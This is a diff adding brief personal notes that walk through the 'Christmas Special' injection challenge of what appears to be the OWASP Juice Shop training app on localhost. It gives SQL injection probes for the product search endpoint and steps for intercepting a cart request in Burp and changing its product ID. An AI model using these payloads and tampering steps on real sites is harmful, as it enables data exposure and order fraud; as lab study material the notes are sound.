@@ -1,0 +1,25 @@
+Christmas Special (Injection)
+
+run nmp
+start burp
+proxy -> open browser -> off "intercept
+go "http://localhost:3000"
+
+1. Identify "GET" request of product data:
+1.1Go to "http://localhost:3000/#/search" -> devtools -> F5 -> under network -> Header
+
+2. "=" not needed:
+2.1 go to "http://localhost:3000/rest/products/search?q=apple"
+
+3.Check if injection is possible:
+3.1go to "http://localhost:3000/rest/products/search?q=';"
+
+4. Find id of Christmas Offer:
+4.1Go to "http://localhost:3000/rest/products/search?q='))--"
+
+5. Adding an item to cart and changing the product to Christmas Offer.
+5.1 Login as a user
+5.2 Click on "intercept" -> add 1 item to cart
+5.3 Click on "forward" change productID to "10"
+5.4 Off "intercept"
+5.5 Product added to cart is Christmas Offer
